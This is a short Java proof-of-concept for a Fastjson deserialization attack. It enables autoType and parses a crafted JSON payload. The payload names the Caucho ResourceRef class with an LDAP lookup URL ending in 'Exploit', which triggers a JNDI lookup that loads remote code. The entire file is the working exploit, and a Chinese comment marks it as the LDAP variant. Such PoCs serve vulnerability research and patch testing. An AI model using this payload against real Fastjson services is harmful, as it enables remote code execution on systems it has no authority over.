import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class QuercusPoc {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"ldap://127.0.0.1:1389/Exploit\"}";//ldap方式
        JSON.parseObject(payload);
    }
}
